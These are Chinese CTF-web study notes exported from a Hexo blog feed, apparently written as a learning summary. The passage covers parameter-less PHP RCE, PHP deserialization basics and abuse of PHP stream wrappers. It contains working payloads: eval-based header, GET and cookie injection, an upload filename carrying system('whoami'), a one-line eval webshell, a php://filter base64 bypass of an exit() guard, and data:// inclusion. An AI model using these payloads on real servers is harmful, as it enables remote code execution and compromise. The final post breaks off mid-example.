invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><h2 id="无参数命令执行rce"><a class="markdownIt-Anchor" href="#无参数命令执行rce">#</a> 无参数命令执行 (RCE)</h2><p>我们可以使用无参数函数任意读文件，也可以执行命令：</p><p>既然传入的 <code>code</code>  值不能含有参数，那我们可不可以把参数放在别的地方， <code>code</code>  用无参数函数来接收参数呢？这样就可以打破无参数函数的限制：</p><p>首先想到 <code>headers</code> ，因为 <code>headers</code>  我们用户可控，于是在 PHP 手册中搜索： <code>headers</code></p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>经过查找，发现 <code>getallheaders()</code>  和 <code>apache_request_headers()</code></p><h4 id="getallheadersapache_request_headers"><a class="markdownIt-Anchor" href="#getallheadersapache_request_headers">#</a> getallheaders()&amp;apache_request_headers()</h4><p><code>getallheaders()</code>  是 <code>apache_request_headers()</code>  的别名函数，但是该函数只能在 <code>Apache</code>  环境下使用</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>接下来利用方式就多了，任何 <code>header</code>  头部都可利用：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>我们可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br><span class="line"><span class="comment">//header</span></span><br><span class="line">Leon: <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>因为我这里 <code>Leon: phpinfo();</code>  排在第一位，所以直接用 <code>pos(current的别名)</code>  取第一个数组的值</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>当然，在系统函数没有禁用的情况下，我们还可以直接使用系统函数：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>根据位置的不同，可以结合前文，构造获取不同位置的数组</p><p>除了可以获得 <code>headers</code> ，PHP 有个函数可以获得所有 PHP 变量：get_defined_vars ()</p><h4 id="get_defined_vars"><a class="markdownIt-Anchor" href="#get_defined_vars">#</a> get_defined_vars()</h4><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>该函数会返回全局变量的值，如 get、post、cookie、file 数据</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里要注意， <code>leon=&gt;phpinfo();</code>  在 <code>_GET</code>  数组中，所以需要使用两次取数组值：</p><p>第一次：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>第二次：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>所以，利用 get 传递新变量可以造成命令执行，post、cookie 同理，这里就不演示了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?leon=<span class="title function_ invoke__">phpinfo</span>();&amp;code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));</span><br></pre></td></tr></table></figure><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>如何利用 file 变量进行 rce 呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;</span>, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure><p>这里要注意的是，file 数组在最后一个，需要 end 定位，因为 payload 直接放在文件的名称上，再 pos 两次定位获得文件名</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h4 id="session_id"><a class="markdownIt-Anchor" href="#session_id">#</a> session_id()</h4><p><code>session_id()</code> ： 可以用来获取 / 设置 当前会话 ID。</p><p>session 需要使用 <code>session_start()</code>  开启，然后返回参数给 <code>session_id()</code></p><p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p><p>但是 <code>hex2bin()</code>  函数可以将十六进制转换为 ASCII 字符，所以我们传入十六进制并使用 <code>hex2bin()</code>  即可</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print&#x27;phpinfo();&#x27;.encode(&#x27;hex&#x27;)</span><br><span class="line">706870696e666f28293b</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b</span><br></pre></td></tr></table></figure><h4 id="getenv"><a class="markdownIt-Anchor" href="#getenv">#</a> getenv()</h4><p><code>getenv()</code>   ：获取环境变量的值 (在 PHP7.1 之后可以不给予参数)</p><p>所以该函数只适用于 PHP7.1 之后版本，否则会出现： <code>Warning:  getenv() expects exactly 1 parameter, 0 given in ...</code>  报错</p><p><img src alt><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="t"></p><p><code>getenv()</code>  可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的 <code>php.ini</code>  中， <code>variables_order</code>  值为： <code>GPCS</code></p><p>也就是说系统在定义 PHP 预定义变量时的顺序是  <code>GET,POST,COOKIES,SERVER</code> ，没有定义 <code>Environment(E)</code> ，你可以修改 <code>php.ini</code>  文件的  <code>variables_order</code>  值为你想要的顺序，如： <code>&quot;EGPCS&quot;</code> 。这时， <code>$_ENV</code>  的值就可以取得了</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>我们来看修改后的值：（环境不同，环境变量显示也不同）</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>对此我们可以加以利用，方法同上文：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="小结"><a class="markdownIt-Anchor" href="#小结">#</a> 小结</h2><p>无参数 RCE 和文件读取实际情况下会存在许多过滤，需要自己结合以上方法绕过，主要还是考察对 PHP 函数的熟练程度</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做鲲鹏杯测试平台时遇到了一道无参数读取文件，学习一下相关知识，做个总结&lt;/p&gt;</summary>
    
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/categories/ctfweb/"/>
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/tags/ctfweb/"/>
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="https://dr4x3zz.github.io/2023/04/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://dr4x3zz.github.io/2023/04/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-04-20T16:49:19.000Z</published>
    <updated>2023-04-30T15:40:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化">#</a> PHP 反序列化</h1><span id="more"></span><h2 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化">#</a> 序列化与反序列化</h2><p>序列化可以将变量转换为字符串，并且在转换的过程中可以保存 当前变量的值</p><p s:8:username;s:5:admin;s:8:password;s:3:100;>O:4:“Name”:2:</p><p>反序列化可以将序列化生成的字符串转换回变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> object(Name)#2 (2) &#123; </span><br><span class="line">[&quot;username&quot;]=&gt; </span><br><span class="line">string(5) &quot;admin&quot; </span><br><span class="line">[&quot;password&quot;]=&gt; </span><br><span class="line">string(3) &quot;100&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>布尔型：b:value =&gt; b:0</li><li>整数型：i:value =&gt; i:1</li><li>字符串型：s:length:value =&gt;s:4 “aaaa”</li><li i:1;s:1 a>数组型：a::{key, value pairs} =&gt;a:1:</li><li>对象型：O:</li><li>NULL 型：</li></ul><h3 id="序列化"><a class="markdownIt-Anchor" href="#序列化">#</a> 序列化</h3><p>序列化说通俗点就是把一个对象变成可以传输的字符串。</p><p>序列化实际是为了传输的方便，以整个对象为单位进行传输，而序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。如果了解底层的同学可以知道，类中的方法本就不在类中。</p><p>而在 php 中，使用函数 serialize () 来返回一个包含字节流的字符串来表示</p><p>比如:</p><p>class S{</p><p>public $test=“sd”;</p><p>}</p><p>$s=new S (); // 创建一个对象</p><p>serialize ($s); // 把这个对象进行序列化</p><p>序列化的结果是:</p><p s:4:test;s:2:sd;>O:1:“S”:1:</p><p>代表的含义依次是:</p><ul><li>O: 代表 object</li><li>1: 代表对象名字长度为一个字符</li><li>S: 对象的名称</li><li>1: 代表对象里面有一个变量</li><li>s: 数据类型 (string)</li><li>4: 变量名称的长度</li><li>test: 变量名称</li><li>s: 数据类型</li><li>2: 变量值的长度</li><li>sd: 变量值</li></ul><p>顺便说一下 PHP 对不同类型的数据用不同的字母进行标示</p><ul><li>a - array</li><li>b - boolean</li><li>d - double</li><li>i - integer</li><li>o - common object</li><li>r - reference</li><li>s - string</li><li>C - custom object</li><li>O - class</li><li>N - null</li><li>R - pointer reference</li><li>U - unicode string</li></ul><h3 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化">#</a> 反序列化</h3><p><strong>反序列化</strong></p><p>就是把被序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><p>使用 unserialize () 函数</p><p>$u=unserialize(“O:1:“S”:1:{s:4:“test”;s:2:“sd”;}”);</p><p>echo $u-&gt;test; // 得到的结果为 sd</p><h2 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法">#</a> 魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct() //类的构造函数</span><br><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="原生类"><a class="markdownIt-Anchor" href="#原生类">#</a> 原生类</h2><p>遍历目录：</p><p>1、DirectoryIterator</p><p>2、FilesystemIterator</p><p>3、GlobIterator</p><p>读取文件：</p><p>4、SplFileObject</p><p>错误类（绕过 hash 比较）：</p><p>5、Error</p><p>6、Exception</p><p>压缩处理类（删除文件）：</p><p>7、ZipArchive</p><p>进行 SSRF：</p><p>8、SoapClient</p><p>目前还没有使用过只是蛮记录一下</p><p>学习链接：<a href="https://zhuanlan.zhihu.com/p/458866772">https://zhuanlan.zhihu.com/p/458866772</a></p><p>根据链接里面学习，我的理解是原生类就是 php 自带的大类，可以理解为不用我们 class 定义的一个类，php 自带的</p><p>等遇到了再回来补充学习一下</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;php反序列化&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php反序列化&quot;&gt;#&lt;/a&gt; PHP 反序列化&lt;/h1&gt;</summary>
    
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/categories/ctfweb/"/>
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/tags/ctfweb/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="https://dr4x3zz.github.io/2023/04/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://dr4x3zz.github.io/2023/04/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2023-04-20T16:49:03.000Z</published>
    <updated>2023-04-30T15:39:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前对 php 为协议有过初步的学习，但是学习的很拙劣，前几天 buu 刷题用到了 php 伪协议，所以打算重新学习一下</p><span id="more"></span><p>学习链接：<a href="https://blog.csdn.net/cosmoslin/article/details/120695429">https://blog.csdn.net/cosmoslin/article/details/120695429</a></p><h2 id="php支持的伪协议"><a class="markdownIt-Anchor" href="#php支持的伪协议">#</a> php 支持的伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="1-phpfilter"><a class="markdownIt-Anchor" href="#1-phpfilter">#</a> 1、 php://filter</h2><p>这个伪协议是我认为最常见最常用到的了</p><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile ()、 file () 和 file_get_contents ()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php://filter 可以获取指定文件源码。当它与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><h3 id="协议参数"><a class="markdownIt-Anchor" href="#协议参数">#</a> 协议参数</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">resource=&lt;要过滤的数据流&gt;</td><td style="text-align:center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td style="text-align:center">read=&lt;读链的筛选列表&gt;</td><td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td></tr><tr><td style="text-align:center">write=&lt;写链的筛选列表&gt;</td><td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td></tr><tr><td style="text-align:center">&lt;；两个链的筛选列表&gt;</td><td style="text-align:center">任何没有以  <code>read=</code>  或  <code>write=</code>  作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>最常用的就是 base64 加密读取文件了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>利用 filter 协议读文件 ±，将 index.php 通过 base64 编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做 php 文件执行了，而通过编码后则可以读取文件源码。</p><p>而使用的 convert.base64-encode，就是一种过滤器。</p><h3 id="利用filter伪协议绕过死亡exit"><a class="markdownIt-Anchor" href="#利用filter伪协议绕过死亡exit">#</a> 利用 filter 伪协议绕过死亡 exit</h3><p>什么是死亡 exit</p><p>死亡 exit 指的是在进行写入 PHP 文件操作时，执行了以下函数：</p><pre><code>file_put_contents($content, '&lt;?php exit();' . $content);</code></pre><p>亦或者</p><pre><code>file_put_contents($content, '&lt;?php exit();?&gt;' . $content);</code></pre><p>这样，当你插入一句话木马时，文件的内容是这样子的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snakin&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡 exit 通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</p><p><strong>base64decode 绕过</strong></p><p>利用 filter 协议来绕过，看下这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line"></span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure><p>当用户通过 POST 方式提交一个数据时，会与死亡 exit 进行拼接，从而避免提交的数据被执行。</p><p>然而这里可以利用 php://filter 的 base64-decode 方法，将 $content 解码，利用 php base64_decode 函数特性去除死亡 exit。</p><p>base64 编码中只包含 64 个可打印字符，当 PHP 遇到不可解码的字符时，会选择性的跳过，这个时候 base64 就相当于以下的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);</span><br><span class="line"></span><br><span class="line">base64_decode($_GET[&#x27;txt&#x27;]);</span><br></pre></td></tr></table></figure><p>所以，当 $content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt;; ?&gt; 和空格等都将被去除，于是剩下的字符就只有 phpexit 以及我们传入的字符了。由于 base64 是 4 个 byte 一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组 base64 进行解码，也就绕过这个死亡 exit 了。</p><p>这个时候后面再加上编码后的一句话木马，就可以 getshell 了。</p><h2 id="2-data"><a class="markdownIt-Anchor" href="#2-data">#</a> 2、data://</h2><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。</p><p>示例用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"> </span><br><span class="line">2、data://text/plain;base64,</span><br><span 